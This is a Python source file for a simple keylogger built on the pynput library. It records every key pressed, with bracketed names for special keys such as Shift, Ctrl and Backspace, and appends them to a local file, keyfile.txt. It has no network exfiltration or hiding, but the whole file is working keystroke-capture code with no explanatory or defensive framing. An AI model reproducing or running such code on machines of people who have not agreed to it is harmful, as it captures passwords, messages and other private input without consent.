from pynput import keyboard

pressed_keys = set()  # Track currently pressed keys

def KeyPressed(key):
    if key in pressed_keys:
        return  # Already pressed, skip logging
    pressed_keys.add(key)

    with open("keyfile.txt", "a") as logkey:
        try:
            logkey.write(f"{key.char}")
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.shift_r: "[SHIFT_R]",
                keyboard.Key.ctrl_l: "[CTRL_L]",
                keyboard.Key.ctrl_r: "[CTRL_R]",
                keyboard.Key.alt_l: "[ALT_L]",
                keyboard.Key.alt_r: "[ALT_R]",
                keyboard.Key.caps_lock: "[CAPSLOCK]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.up: "[UP]",
                keyboard.Key.down: "[DOWN]",
                keyboard.Key.left: "[LEFT]",
                keyboard.Key.right: "[RIGHT]",
                keyboard.Key.delete: "[DELETE]",
                keyboard.Key.home: "[HOME]",
                keyboard.Key.end: "[END]",
                keyboard.Key.page_up: "[PAGE_UP]",
                keyboard.Key.page_down: "[PAGE_DOWN]",
                keyboard.Key.insert: "[INSERT]",
                keyboard.Key.menu: "[MENU]",
                keyboard.Key.num_lock: "[NUMLOCK]",
                keyboard.Key.print_screen: "[PRINT_SCREEN]",
                keyboard.Key.pause: "[PAUSE]",
                keyboard.Key.media_volume_up: "[VOLUME_UP]",
                keyboard.Key.media_volume_down: "[VOLUME_DOWN]",
                keyboard.Key.media_volume_mute: "[VOLUME_MUTE]",
            }

            if key in special_keys:
                logkey.write(special_keys[key])
            else:
                logkey.write(f"[{key.name.upper()}]")

def KeyReleased(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=KeyPressed, on_release=KeyReleased)
    listener.start()
    input()  # Keeps the script running
